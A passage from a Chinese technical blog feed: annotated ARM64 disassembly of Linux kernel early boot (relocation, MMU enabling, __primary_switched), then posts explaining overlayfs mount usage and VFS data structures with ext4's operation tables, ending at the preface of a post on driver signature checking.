0xd5d394        ldr    w10, 0xd5d43c  &#x2F;&#x2F; size of reloc table  
&#x2F;&#x2F; default virtual offset                                                                                                                                  │
0xd5d398        mov    x11, #0xffffffc0ffffffff        &#x2F;&#x2F; #-270582939649                                                                                                  │
0xd5d39c        movk   x11, #0x800, lsl #16                                                                                                                               │
0xd5d3a0        movk   x11, #0x0     
&#x2F;&#x2F; actual virtual offset                                                                                                                                     │
0xd5d3a4        add    x11, x11, x23   
&#x2F;&#x2F; x9保存了.rela.dyn区域的链接地址
&#x2F;&#x2F; x10保存了.rela.dyn区域的结束地址                                                                                                                                   │
0xd5d3a8        add    x9, x9, x11                                                                                                                                        │
0xd5d3ac        add    x10, x9, x10                                                                                                                                       │
0xd5d3b0        cmp    x9, x10                                                                                                                                            │
0xd5d3b4        b.cs   0xd5d3d4  &#x2F;&#x2F; b.hs, b.nlast 
&#x2F;&#x2F;获取一项offset和info+flag                                                                                                                        │
0xd5d3b8        ldp    x12, x13, [x9], #24      
&#x2F;&#x2F;获取Addend值                                                                                                                          │
0xd5d3bc        ldur   x14, [x9, #-8]                                                                                                                                     │
0xd5d3c0        cmp    w13, #0x403                                                                                                                                        │
0xd5d3c4        b.ne   0xd5d3b0  &#x2F;&#x2F; b.any    
&#x2F;&#x2F;&#x2F;&#x2F; relocate,这里主要是修正[offset + KASLR offset] &#x3D; KASLR offset + append的值,也就是符号重定位了                                                                                                                             │
0xd5d3c8        add    x14, x14, x23                                                                                                                                      │
0xd5d3cc        str    x14, [x12, x23]                                                                                                                                    │
0xd5d3d0        b      0xd5d3b0                                                                                                                                           │
0xd5d3d4        ret    
@ SYM_FUNC_END(__relocate_kernel)

@ SYM_FUNC_START_LOCAL(__primary_switch)
0xd5d3d8        mov    x19, x0         &#x2F;&#x2F; preserve new SCTLR_EL1 value         
0xd5d3dc        mrs    x20, sctlr_el1  &#x2F;&#x2F; preserve old SCTLR_EL1 value         
0xd5d3e0        adrp   x1, 0x181d000   &#x2F;&#x2F; 将init_pg_dir 给x1  
&#x2F;&#x2F;跳转过去初始化mmu                                                            
0xd5d3e4        bl     0xd5d308        &#x2F;&#x2F;__enable_mmu        
&#x2F;&#x2F;将kernel image的.rela.dyn段实现重定位                  
0xd5d3e8        bl     0xd5d390        &#x2F;&#x2F;__relocate_kernel       

&#x2F;&#x2F;注意ldr指令加载的是__primary_switched的链接地址，
&#x2F;&#x2F;    注意这里的链接地址已经是虚拟地址了（例子值为：0xffffffc008f902a0）              
0xd5d3ec        ldr    x8, 0xd5d448    &#x2F;&#x2F;__primary_switched给x8                
0xd5d3f0        adrp   x0, 0x200000    &#x2F;&#x2F;__PHYS_OFFSET给x0   
&#x2F;&#x2F;注意这里的跳转指令，这个时候mmu已经生效了，由于目标地址为0xffffffc008f902a0，
&#x2F;&#x2F;      所以这个时候查询的页表为init_pg_dir                  
0xd5d3f4        blr    x8  &#x2F;&#x2F;跳转到__primary_switched                          
0xd5d3f8        isb                                                           
0xd5d3fc        msr    sctlr_el1, x20                                         
0xd5d400        isb                                                           
0xd5d404        bl     0x1190040                                              
0xd5d408        tlbi   vmalle1                                                
0xd5d40c        dsb    nsh                                                    
0xd5d410        isb                                                           
0xd5d414        msr    sctlr_el1, x19                                         
0xd5d418        isb                                                           
0xd5d41c        ic     iallu                                                  
0xd5d420        dsb    nsh                                                    
0xd5d424        isb                                                           
0xd5d428        bl     0xd5d390                                               
0xd5d42c        ldr    x8, 0xd5d448                                           
0xd5d430        adrp   x0, 0x200000                                           
0xd5d434        br     x8        
@ SYM_FUNC_END(__primary_switch)
  这部分主要是在页表初始化好后，进行el1的一些cpu设置，并准备好mmu开启参数。
@ 	.pushsection &quot;.idmap.text&quot;, &quot;awx&quot;
@ SYM_FUNC_START(__cpu_setup)
&#x2F;&#x2F; Invalidate local TLB
0x0000000000d5d6f4:	tlbi	vmalle1
0x0000000000d5d6f8:	dsb	nsh

0x0000000000d5d6fc:	mov	x1, #0x300000              	&#x2F;&#x2F; #3145728
&#x2F;&#x2F; Enable FP&#x2F;ASIMD
0x0000000000d5d700:	msr	cpacr_el1, x1
&#x2F;&#x2F; Reset mdscr_el1 and disable
0x0000000000d5d704:	mov	x1, #0x1000                	&#x2F;&#x2F; #4096
&#x2F;&#x2F; access to the DCC from EL0
0x0000000000d5d708:	msr	mdscr_el1, x1
&#x2F;&#x2F; Unmask debug exceptions now,
0x0000000000d5d70c:	isb


0x0000000000d5d710:	msr	daifclr, #0x8
0x0000000000d5d714:	mrs	x1, id_aa64dfr0_el1
0x0000000000d5d718:	sbfx	x1, x1, #8, #4
0x0000000000d5d71c:	cmp	x1, #0x1
0x0000000000d5d720:	b.lt	0xd5d728  &#x2F;&#x2F; b.tstop
0x0000000000d5d724:	msr	pmuserenr_el0, xzr
0x0000000000d5d728:	mrs	x1, id_aa64pfr0_el1
0x0000000000d5d72c:	ubfx	x1, x1, #44, #4
0x0000000000d5d730:	cbz	x1, 0xd5d738
0x0000000000d5d734:	msr	s3_3_c13_c2_3, xzr
0x0000000000d5d738:	mov	x17, #0x400000000           	&#x2F;&#x2F; #17179869184
0x0000000000d5d73c:	movk	x17, #0x44, lsl #16
0x0000000000d5d740:	movk	x17, #0xffff
0x0000000000d5d744:	mov	x16, #0x40000000000000      	&#x2F;&#x2F; #18014398509481984
0x0000000000d5d748:	movk	x16, #0x30, lsl #32
0x0000000000d5d74c:	movk	x16, #0xb559, lsl #16
0x0000000000d5d750:	movk	x16, #0x3519
0x0000000000d5d754:	mrs	x9, midr_el1
0x0000000000d5d758:	mov	x5, #0xffffffffffefffff    	&#x2F;&#x2F; #-1048577
0x0000000000d5d75c:	movk	x5, #0xffff
0x0000000000d5d760:	and	x9, x9, x5
0x0000000000d5d764:	mov	x5, #0x460f0000            	&#x2F;&#x2F; #1175388160
0x0000000000d5d768:	movk	x5, #0x10
0x0000000000d5d76c:	cmp	x9, x5
0x0000000000d5d770:	b.ne	0xd5d788  &#x2F;&#x2F; b.any
0x0000000000d5d774:	mov	x5, #0x60000000000000      	&#x2F;&#x2F; #27021597764222976
0x0000000000d5d778:	movk	x5, #0x0, lsl #32
0x0000000000d5d77c:	movk	x5, #0x0, lsl #16
0x0000000000d5d780:	movk	x5, #0x0
0x0000000000d5d784:	bic	x16, x16, x5
0x0000000000d5d788:	adrp	x9, 0x1555000
0x0000000000d5d78c:	ldr	x9, [x9, #3272]
0x0000000000d5d790:	bfxil	x16, x9, #0, #6
0x0000000000d5d794:	mrs	x5, id_aa64mmfr0_el1
0x0000000000d5d798:	ubfx	x5, x5, #0, #3
0x0000000000d5d79c:	mov	x6, #0x5                   	&#x2F;&#x2F; #5
0x0000000000d5d7a0:	cmp	x5, x6
0x0000000000d5d7a4:	csel	x5, x6, x5, hi  &#x2F;&#x2F; hi &#x3D; pmore
0x0000000000d5d7a8:	bfi	x16, x5, #32, #3


0x0000000000d5d7ac:	mrs	x9, id_aa64mmfr1_el1
0x0000000000d5d7b0:	and	x9, x9, #0xf
0x0000000000d5d7b4:	cbz	x9, 0xd5d7bc
0x0000000000d5d7b8:	orr	x16, x16, #0x8000000000


0x0000000000d5d7bc:	msr	mair_el1, x17
0x0000000000d5d7c0:	msr	tcr_el1, x16

&#x2F;*
  * Prepare SCTLR, INIT_SCTLR_EL1_MMU_ON 给 x0
  *&#x2F;
0x0000000000d5d7c4:	mov	x0, #0x200000000000000     	&#x2F;&#x2F; #144115188075855872
0x0000000000d5d7c8:	movk	x0, #0x20, lsl #32
0x0000000000d5d7cc:	movk	x0, #0x34f4, lsl #16
0x0000000000d5d7d0:	movk	x0, #0xd91d

&#x2F;&#x2F; return to head.S
0x0000000000d5d7d4:	ret
0x0000000000d5d7d8:	msr	tpidr_el2, x13
0x0000000000d5d7dc:	msr	disr_el1, xzr
@ SYM_FUNC_END(__cpu_setup)
  当我们进入__primary_switched的时候，这个时候用的是内核地址。同时地址翻译是由init_pg_dir来完成。此过程初始化init_task，将
@ SYM_FUNC_START_LOCAL(__primary_switched)

&#x2F;&#x2F;将init_task给x4
0xffffffc008f902a0      adrp   x4, 0xffffffc00934f000 &lt;inet6_offloads+1376&gt;                        
0xffffffc008f902a4      add    x4, x4, #0xb80   

&#x2F;&#x2F;init_cpu_task                                                   
0xffffffc008f902a8      msr    sp_el0, x4                                                          
0xffffffc008f902ac      ldr    x5, [x4, #24]                                                       
0xffffffc008f902b0      add    sp, x5, #0x4, lsl #12                                               
0xffffffc008f902b4      sub    sp, sp, #0x150                                                      
0xffffffc008f902b8      stp    xzr, xzr, [sp, #304]                                                
0xffffffc008f902bc      add    x29, sp, #0x130                                                     
0xffffffc008f902c0      adrp   x5, 0xffffffc009349000 &lt;event_hash+616&gt;                             
0xffffffc008f902c4      add    x5, x5, #0x7f8                                                      
0xffffffc008f902c8      ldr    w6, [x4, #64]                                                       
0xffffffc008f902cc      ldr    x5, [x5, x6, lsl #3]                                                
0xffffffc008f902d0      msr    tpidr_el1, x5          

&#x2F;&#x2F;加载异常向量表地址                                                                             
0xffffffc008f902d4      adrp   x8, 0xffffffc008010000 &lt;bcm2835_handle_irq&gt;                         
0xffffffc008f902d8      add    x8, x8, #0x800                                                      
0xffffffc008f902dc      msr    vbar_el1, x8                                                        
0xffffffc008f902e0      isb 

&#x2F;&#x2F;将x29,x30放入到sp
0xffffffc008f902e4      stp    x29, x30, [sp, #-16]!                                               
0xffffffc008f902e8      mov    x29, sp  

&#x2F;&#x2F; Save FDT pointer                                                                                                        
0xffffffc008f902ec      adrp   x5, 0xffffffc009001000 &lt;tmp_cmdline.73085+2040&gt;                     
0xffffffc008f902f0      str    x21, [x5, #920]                      

&#x2F;&#x2F; Save the offset between                                                                              
0xffffffc008f902f4      adrp   x4, 0xffffffc008b70000 &lt;kimage_vaddr&gt;                                                                              
0xffffffc008f902f8      ldr    x4, [x4]       
&#x2F;&#x2F; the kernel virtual and                                                                                                    
0xffffffc008f902fc      sub    x4, x4, x0                                    
&#x2F;&#x2F; physical mappings                                                                     
0xffffffc008f90300      adrp   x5, 0xffffffc008ebb000 &lt;rt_sched_class+192&gt;                                                                        
0xffffffc008f90304      str    x4, [x5, #3392]       

&#x2F;&#x2F;Clear BSS                                                                                             
0xffffffc008f90308      adrp   x0, 0xffffffc009529000 &lt;__kvm_nvhe_cur&gt;                                                                            
0xffffffc008f9030c      add    x0, x0, #0x0                                                                                                       
0xffffffc008f90310      mov    x1, xzr                                                                                                            
0xffffffc008f90314      adrp   x2, 0xffffffc00961c000 &lt;gssp_stats+24&gt;                                                                             
0xffffffc008f90318      add    x2, x2, #0xf8                                                                                                      
0xffffffc008f9031c      sub    x2, x2, x0                                                                                                         
0xffffffc008f90320      bl     0xffffffc008664200 &lt;memset&gt;                                                                                        
0xffffffc008f90324      dsb    ishst    

&#x2F;&#x2F; pass FDT address in x0                                                                                                          
0xffffffc008f90328      mov    x0, x21    
&#x2F;&#x2F; Try mapping the FDT early                                                                                                        
0xffffffc008f9032c      bl     0xffffffc008f946c8 &lt;early_fdt_map&gt;    
&#x2F;&#x2F; Parse cpu feature overrides                                                                    
0xffffffc008f90330      bl     0xffffffc008f96354 &lt;init_feature_override&gt;    
&#x2F;&#x2F;already running randomized?                                                                     
0xffffffc008f90334      tst    x23, #0xffffffffffe00000                                                                                           
0xffffffc008f90338      b.ne   0xffffffc008f90350 &lt;__primary_switched+176&gt;  &#x2F;&#x2F; b.any
&#x2F;&#x2F; parse FDT for KASLR options                                                              
0xffffffc008f9033c      bl     0xffffffc008f96b80 &lt;kaslr_early_init&gt;  
&#x2F;&#x2F; KASLR disabled? just proceed          这里直接跳转到 0xffffffc008f90350                                                              
0xffffffc008f90340      cbz    x0, 0xffffffc008f90350 &lt;__primary_switched+176&gt;  
&#x2F;&#x2F; record KASLR offset                                                                  
0xffffffc008f90344      orr    x23, x23, x0  
&#x2F;&#x2F; we must enable KASLR, return                                                                                                     
0xffffffc008f90348      ldp    x29, x30, [sp], #16      
&#x2F;&#x2F; to __primary_switch()                                                                                         
0xffffffc008f9034c      ret  

&#x2F;&#x2F; Prefer VHE if possible
0xffffffc008f90350      bl     0xffffffc008021e6c &lt;switch_to_vhe&gt;                                                                                 
0xffffffc008f90354      ldp    x29, x30, [sp], #16                  
&#x2F;&#x2F;跳转到kernel_start                                                                              
0xffffffc008f90358      bl     0xffffffc008f90c40 &lt;start_kernel&gt;                                                                                  
0xffffffc008f9035c      brk    #0x800                                                                                                             
0xffffffc008f90360      msr    tpidr_el2, x5  
@ SYM_FUNC_END(__primary_switched)

  注意，阅读本文这部分时，需要对照着head.S来看，这样才有一个基本的认识。




后记

  本文得到的基本流程为，上电，保存上电后的基础寄存器，在el2的模式下初始化cpu，保存启动标志，初始化两个页表（注意，这部分是精华，我这部分注释也最多），然后初始化el1模式下的cpu，并准备好开启mmu，最后在__primary_switch里面开启mmu，当mmu开启后，这个时候的地址还是物理地址，所以我们需要一个映射物理地址和虚拟地址相等的页表（idmap_pg_dir），重定位符号表，最后加载__primary_switched的虚拟地址（其虚拟地址在kernel logical memory map中），跳转到执行（此时查表init_pg_dir），然后初始化init_task，最后进入start_kernel。
  本文也没有尝试去完全注释每句代码，太繁杂了，对于我来说也没有意义，特别是一些特别的初始化，只有以后遇到了才去查询。Linux现代内核太大了，后面可能就要去看个人喜欢的模块，这样才有收获，不要尝试去阅读全部内容，那样太难了。
  每个人对于这部分的关注可能都是不一样的，如果本文没有写的地方，可以尝试搜索对应的关键字，可以得到更多的信息。
参考文献

[1]https://blog.csdn.net/u011728480/article/details/79498816

[2]https://blog.csdn.net/u011728480/article/details/88420467

[3]https://blog.csdn.net/u011728480/article/details/88553602

[4]https://blog.csdn.net/u011728480/article/details/114491022

[5]https://developer.arm.com/documentation/100933/0100

[6]https://www.kernel.org/doc/html/latest/arm64/memory.html





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>嵌入式</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 文件系统(三) --- overlayfs简介</title>
    <url>/2024/05/18/blog_idx_132/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  对于overlay文件系统来说，我以前只是听过，具体貌似docker里面使用了相关技术，但是也仅仅限于听过了。
  最近，由于需要通过tar来备份一个系统的rootfs来做测试，我发现了很多重复备份的内容，一看，嘿，可能是overlay文件系统导致的，因此，我可能需要先了解了解这个文件系统是干嘛的，然后才能够采取合适的方案来备份rootfs。




实现大致原理

  overlayfs主要是结合了两个文件系统 – “upper fs”  和  “lower fs” 。其组成规则是：


当&quot;upper fs&quot;和  &quot;lower fs&quot;存在两个相同的名字的文件时，&quot;upper fs&quot;的文件是可见的，&quot;lower fs&quot;的文件是隐藏的。


当&quot;upper fs&quot;和  &quot;lower fs&quot;存在两个相同的名字的目录时，会合并两个目录的文件。


  overlayfs主要是涉及目录的操作，其挂载命令是：
# 堆叠两个目录，合并lower目录，upperdir目录，展示到merge目录
# workdir和upperdir必须是同一个文件系统的空目录
mount -t overlay overlay -olowerdir=/lower,upperdir=/upper,workdir=/work /merged

# 堆叠多个目录（从最右边的目录开始向左堆叠），合并lower3，lower2，lower1，展示到merged目录
mount -t overlay overlay -olowerdir=/lower1:/lower2:/lower3 /merged
  对， 本文的内容已经完了，overlay的大致工作原理和工作效果和说完了。
  其他细节，请参考 参考小节。




后记

  不知道大家注意到没有，我们在描述其组合的规则的时候，对于：隐藏&quot;lower fs&quot;的文件、合并两个目录的文件  的操作说的是那么的自然，但是其是怎么实现的呢？其实这才是overlayfs的一些实际技术原理。
  其实，这一切都与linux的vfs和ext文件系统有一些关系，详情请参考本文的前置文章：


《Linux 文件系统(一) — ext4文件系统简介》 https://www.cnblogs.com/Iflyinsky/p/18162137


《Linux 文件系统(二) — vfs简单分析》 https://www.cnblogs.com/Iflyinsky/p/18187558


参考文献


https://docs.kernel.org/filesystems/overlayfs.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>overlayfs</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 文件系统(二) --- vfs简单分析</title>
    <url>/2024/05/12/blog_idx_131/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  VFS(Virtual File System)是一种软件抽象，主要还是为了连接用户态、内核态和实际文件系统本身。例如：我们可以write一个字符串到磁盘ext4 fs上的某个文件。
  在linux里面，有各种各样的文件系统，它们实际存放的位置可能是硬盘（ext4fs等）、RAM(sysfs, procfs, devtmpfs等)、网络(nfs等)等等存储介质。




VFS的基础知识

  这里主要介绍VFS的基础知识,以及我们常见的文件操作怎么对应到VFS里面，主要以ext4 fs与vfs的关联为例子.


Directory Entry Cache (dcache)
  在vfs里面提供了一种缓存机制，缓存struct dentry项，这个dcache在内核里面表示了一个文件系统的整个文件目录信息（从根目录开始的一个目录信息），但是作为一种cache数据结构，一般会存在cache miss然后创建对应struct dentry。这样就可以很快的查找到我们传入的一个路径的文件对于的struct dentry项。
  vfs通过我们常见的open接口操作文件时，一般是用路径来标识一个文件名的，那么怎么将我们传入的名字转换成对应的目录/文件信息呢？答案就是上面提到的dcache数据结构，通过查询dcache得到目录/文件信息，这个部分的内容也是open系统调用常常做的事情。
  下面是dcache项的基本定义：
struct dentry &#123;
	/* RCU lookup touched fields */
	unsigned int d_flags;		/* protected by d_lock */
	seqcount_spinlock_t d_seq;	/* per dentry seqlock */
	struct hlist_bl_node d_hash;	/* lookup hash list */
	struct dentry *d_parent;	/* parent directory */
	struct qstr d_name;
	struct inode *d_inode;		/* Where the name belongs to - NULL is
					 * negative */
	unsigned char d_iname[DNAME_INLINE_LEN];	/* small names */
	... ...
	struct super_block *d_sb;	/* The root of the dentry tree */
	... ...
&#125;;
  还记得我们在《Linux 文件系统(一) — ext4文件系统简介》（ https://www.cnblogs.com/Iflyinsky/p/18162137 ）中提到，目录也是一种文件嘛？文件又是用inode来表示的，那么struct dentry就可以得到对应的struct inode信息了。


struct inode 对象
  大家应该都听过一句话，在unix里面，一切皆文件。那么对于vfs来说，一个独立的文件就是struct inode对象.
/*
 * Keep mostly read-only and often accessed (especially for
 * the RCU path lookup and 'stat' data) fields at the beginning
 * of the 'struct inode'
 */
struct inode &#123;

	... ...
	const struct inode_operations	*i_op;
	struct super_block	*i_sb;
	struct address_space	*i_mapping;	
	... ...
&#125;
  其实这个struct inode和struct ext4_inode有许多相似的属性，他们也有些许关联。
  对于struct inode来说，很重要的就是struct inode_operations，这个代表着我们可以对这个inode进行的操作，其结构大概如下：
struct inode_operations &#123;
	struct dentry * (*lookup) (struct inode *,struct dentry *, unsigned int);

	... ...

	int (*create) (struct mnt_idmap *, struct inode *,struct dentry *,
		       umode_t, bool);
	int (*link) (struct dentry *,struct inode *,struct dentry *);
	int (*unlink) (struct inode *,struct dentry *);

	... ...
&#125;
  根据父目录的对应的lookup函数，我们可以查找对应的文件inode信息。此外，还有创建删除inode节点的方法，这些方法在文件系统装载的时候实现。


struct file 对象
  我们上面讲的struct dentry和struct inode是和对应的文件系统存储的数据是息息相关的。但是实际我们操作文件的第一步是打开文件，对于一个打开的文件，在内核里面使用struct file来标识，其结构如下：
struct path &#123;
	struct vfsmount *mnt;
	struct dentry *dentry;
&#125;;

/*
 * f_&#123;lock,count,pos_lock&#125; members can be highly contended and share
 * the same cacheline. f_&#123;lock,mode&#125; are very frequently used together
 * and so share the same cacheline as well. The read-mostly
 * f_&#123;path,inode,op&#125; are kept on a separate cacheline.
 */
struct file &#123;
	
	... ...

	struct path		f_path;
	struct inode		*f_inode;	/* cached value */
	const struct file_operations	*f_op;
	
	... ...
&#125;
  对于一个file对象来说，除了上面提到的struct dentry和struct inode关联外，还有一个重要的结构是：struct file_operations，对于这个结构来说，大家应该非常的熟悉，包含了open/close/read/write等等接口：
struct file_operations &#123;
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	
	... ...

	int (*open) (struct inode *, struct file *);

	... ...
  到这里，其实我们vfs我们常见用到的基本就讲完了，串起来是说就是open一个文件，创建一个struct file对象，关联一个struct dentry和struct inode，这时就可以对文件进行操作了.




VFS的深入知识

  


FileSystem 的注册和取消注册
  我们前面提到了，vfs最终会对接到实际文件系统本身，那么VFS支持哪些FS呢？在linux的/proc/filesystems文件中，存放了当前注册到vfs的所有支持的FS。
  下面我们介绍文件系统的注册和取消注册：
/*
 * Filesystem context for holding the parameters used in the creation or
 * reconfiguration of a superblock.
 *
 * Superblock creation fills in ->root whereas reconfiguration begins with this
 * already set.
 *
 * See Documentation/filesystems/mount_api.rst
 */
struct fs_context &#123;
	const struct fs_context_operations *ops;
	struct mutex		uapi_mutex;	/* Userspace access mutex */
	struct file_system_type	*fs_type;
	void			*fs_private;	/* The filesystem's context */
	void			*sget_key;
	struct dentry		*root;		/* The root and superblock */

	... ...
&#125;

struct file_system_type &#123;
        const char *name; //文件系统名字，例如ext4
        int fs_flags;
        int (*init_fs_context)(struct fs_context *);
        const struct fs_parameter_spec *parameters;
        struct dentry *(*mount) (struct file_system_type *, int,
                const char *, void *);
        void (*kill_sb) (struct super_block *);
        struct module *owner;
        struct file_system_type * next;
        struct hlist_head fs_supers;
		
		... ...
&#125;;


#include &lt;linux/fs.h>
extern int register_filesystem(struct file_system_type *);
extern int unregister_filesystem(struct file_system_type *);
  在register_filesystem/unregister_filesystem函数里面，主要是对内核里面的file_system_type变量进行链表操作，注册就是增加链表节点，取消注册就是删除链表节点。


FileSystem的挂载和卸载
  这里我们先举个例子，对于linux来说，内核启动后第一个挂载的文件系统，也就是挂载在/根目录的文件系统。如果大家观察过一些linux的启动相关信息，有个常见的问题就是：
Error: root fs cannot be detected。
  这个问题就是内核没有找到适合的根文件系统来加载，一般来说失败后会自动进入一个叫做initramfs的文件系统，方便进行诊断。
  对于用户挂载和卸载文件系统来说，一般我们是使用mount/umount命令，其和内核启动后挂载第一个文件系统的操作类似，其实我们执行mount命令的时候，对调用对应的file_system_type的mount函数（看上文中的file_system_type有一个mount函数）来完成挂载的操作。
  首先我们来看看mount命令是怎么到file_system_type中的mount函数的。我们来看看调用序列：


mount命令调用userspace 中的mount函数


接着调用sys_mount


接着调用do_mount


接着调用path_mount


接着调用do_new_mount，在这里我们会根据参数，获取或者创建struct file_system_type对象。(linux kernel v4.20.17)


接着调用vfs_kern_mount。(linux kernel v4.20.17)


接着调用mount_fs，在这里面通过struct file_system_type对象调用ext4_mount函数。(linux kernel v4.20.17)


  上面的操作完毕， 我们得到一个struct vfsmount 和  struct mount 对象，这个对象代表了一个文件系统的挂载基本信息。struct mount 中的mnt_instance指向的是ext4 fs 的root dentry中的super_block存放的链表。意思就是，创建好的一个文件系统，其挂载点信息可以在root dentry中找到。
struct vfsmount &#123;
	struct dentry *mnt_root;	/* root of the mounted tree */
	struct super_block *mnt_sb;	/* pointer to superblock */
	int mnt_flags;
	struct mnt_idmap *mnt_idmap;
&#125; __randomize_layout;

struct mount &#123;
	struct hlist_node mnt_hash;
	struct mount *mnt_parent;
	struct dentry *mnt_mountpoint;
	struct vfsmount mnt;
	... ...
	struct list_head mnt_instance;	/* mount instance on sb->s_mounts */
	... ...
&#125;
  下面我们来讲讲ext4的file_system_type定义中，ext4_mount的调用。
  注意，file_system_type的mount接口在新的内核版本中被废弃了，因为有新的mount api实现，所以在5.17-rc1中，ext4_mount这个函数无了。下面是linux kernel中这个提交的commit内容：
ext4: switch to the new mount api
Add the necessary functions for the fs_context_operations. Convert and
rename ext4_remount() and ext4_fill_super() to ext4_get_tree() and
ext4_reconfigure() respectively and switch the ext4 to use the new api.

One user facing change is the fact that we no longer have access to the
entire string of mount options provided by mount(2) since the mount api
does not store it anywhere. As a result we can't print the options to
the log as we did in the past after the successful mount.

Signed-off-by: Lukas Czerner &lt;lczerner@redhat.com>
Reviewed-by: Carlos Maiolino &lt;cmaiolino@redhat.com>
Link: https://lore.kernel.org/r/20211027141857.33657-13-lczerner@redhat.com
Signed-off-by: Theodore Ts'o &lt;tytso@mit.edu>

commit-id:cebe85d570cf84804e848332d6721bc9e5300e07
  下面，我们仍用ext4_mount的函数内容来讲解。对于挂载来说，一般会做如下操作(对于磁盘来说)：


根据mount命令的参数，ext4_mount调用mount_bdev函数。


根据mount_bdev函数的dev_name获取struct block_device对象。


通过struct block_device对象，初始化并创建struct super_block对象，将对象放到super_blocks链表中。


返回此文件系统对于的根dentry的引用（例如ext4fs: 根据block group0中的inode table[2]获取根节点，并创建dentry），这个时候我们就可以解析整个文件系统的所有文件目录了。


  从上面的说明我们可以知道，一个struct super_block对象，代表一个挂载的文件系统。其定义如下：
struct super_block &#123;
	struct list_head	s_list;		/* Keep this first */
	dev_t			s_dev;		/* search index; _not_ kdev_t */
	unsigned char		s_blocksize_bits;
	unsigned long		s_blocksize;
	loff_t			s_maxbytes;	/* Max file size */
	struct file_system_type	*s_type;
	const struct super_operations	*s_op;

	... ...
&#125;
  从上面的结构来看，最重要的就是s_op了，这个代表对一个文件系统的一些基本操作方法。此外，对于s_list来说，很明显的表达了struct super_block会被存储到一个链表里面，在linux里面，是存放在 static LIST_HEAD(super_blocks) 变量中的。
struct super_operations &#123;
   	struct inode *(*alloc_inode)(struct super_block *sb);
	void (*destroy_inode)(struct inode *);
	void (*free_inode)(struct inode *);

   	void (*dirty_inode) (struct inode *, int flags);
	int (*write_inode) (struct inode *, struct writeback_control *wbc);
	int (*drop_inode) (struct inode *);
	void (*evict_inode) (struct inode *);

	... ...
&#125;


ext4的各种操作实现
  上面我们提到了struct super_operations、struct inode_operations、struct file_operations这三个重要的操作，对于挂载的ext4fs来说，其实现在ext4中实现，并对应赋值给对应的指针。他们定义分别如下：
const struct file_operations ext4_file_operations = &#123;
	.llseek		= ext4_llseek,
	.read_iter	= ext4_file_read_iter,
	.write_iter	= ext4_file_write_iter,
	.iopoll		= iocb_bio_iopoll,
	.unlocked_ioctl = ext4_ioctl,
#ifdef CONFIG_COMPAT
	.compat_ioctl	= ext4_compat_ioctl,
#endif
	.mmap		= ext4_file_mmap,
	.mmap_supported_flags = MAP_SYNC,
	.open		= ext4_file_open,
	.release	= ext4_release_file,
	.fsync		= ext4_sync_file,
	.get_unmapped_area = thp_get_unmapped_area,
	.splice_read	= ext4_file_splice_read,
	.splice_write	= iter_file_splice_write,
	.fallocate	= ext4_fallocate,
&#125;;

const struct inode_operations ext4_file_inode_operations = &#123;
	.setattr	= ext4_setattr,
	.getattr	= ext4_file_getattr,
	.listxattr	= ext4_listxattr,
	.get_inode_acl	= ext4_get_acl,
	.set_acl	= ext4_set_acl,
	.fiemap		= ext4_fiemap,
	.fileattr_get	= ext4_fileattr_get,
	.fileattr_set	= ext4_fileattr_set,
&#125;;


static const struct super_operations ext4_sops = &#123;
	.alloc_inode	= ext4_alloc_inode,
	.free_inode	= ext4_free_in_core_inode,
	.destroy_inode	= ext4_destroy_inode,
	.write_inode	= ext4_write_inode,
	.dirty_inode	= ext4_dirty_inode,
	.drop_inode	= ext4_drop_inode,
	.evict_inode	= ext4_evict_inode,
	.put_super	= ext4_put_super,
	.sync_fs	= ext4_sync_fs,
	.freeze_fs	= ext4_freeze,
	.unfreeze_fs	= ext4_unfreeze,
	.statfs		= ext4_statfs,
	.show_options	= ext4_show_options,
	.shutdown	= ext4_shutdown,
#ifdef CONFIG_QUOTA
	.quota_read	= ext4_quota_read,
	.quota_write	= ext4_quota_write,
	.get_dquots	= ext4_get_dquots,
#endif
&#125;;
  从上面来，还没有挂载的时候，对于一个ext4fs的各种操作就已经实现了，挂载只是将这些操作实现对应赋值而已。
  这里多说一句，其他的fs也会有对应operations的实现。例如：我们常见的驱动开发的时候，file_operations的填充可以说是基操。




总结

  总的来说，vfs提供了对各种fs的操作的封装。mount命令可以将特定文件系统绑定到vfs。当我们mount一个fs时，可以得到这个fs的root dentry，super_block，mount等结构信息。
  我们根据一个fs的root dentry信息，可以解析出其目录下的所有文件目录结构，从而达到访问特定文件系统、特定设备的文件的目的。
参考文献


https://www.kernel.org/doc/html/next/filesystems/vfs.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>vfs</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux驱动加载源码分析（安全加载 、签名、校验）</title>
    <url>/2024/07/14/blog_idx_133/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  很久很久以前，在android上面移植linux驱动的时候，由于一些条件限制，导致我们测试驱动非常的麻烦。其中有一个麻烦就是驱动校验失败，然后内核拒绝加载驱动。
